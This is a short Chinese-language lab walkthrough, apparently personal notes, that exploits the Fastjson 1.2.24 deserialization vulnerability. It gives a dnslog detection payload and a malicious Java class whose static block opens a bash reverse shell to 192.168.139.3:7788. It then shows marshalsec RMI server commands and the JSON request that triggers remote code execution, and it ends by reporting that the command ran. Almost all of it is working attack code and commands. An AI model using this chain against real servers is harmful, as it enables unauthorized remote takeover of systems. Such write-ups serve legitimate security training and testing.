使用dnslog探测Fastjson反序列化是否存在
```
POST / HTTP/1.1
Host: 192.168.68.46:8090
Content-Type: application/json
Content-Length: 138

{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://52cd2d0a.log.dnslog.pp.ua.","autoCommit":true}}
```
![[Fastjson 1.2.24-20260911.png]]
创建恶意类
```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.139.3/7788 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```
使用`javac javac TouchFile.java`编译为`TouchFile.class文件`
启动http服务，可通过http服务获取恶意类
![[Fastjson 1.2.24-20260911-1.png]]
![[Fastjson 1.2.24-20260911-2.png]]
使用marshalsec启动RMI服务，将恶意类与RMI服务绑定
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.139.3:8000/#TouchFile" 9999`
![[Fastjson 1.2.24-20260911-5.png]]
对RMI服务发送请求
```
POST / HTTP/1.1
Host: 192.168.68.46:8090
Content-Type: application/json
Content-Length: 143

{
"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.139.3:9999/TouchFile",
        "autoCommit":true}
}
```
成功执行命令
![[Fastjson 1.2.24-20260911-4.png]]
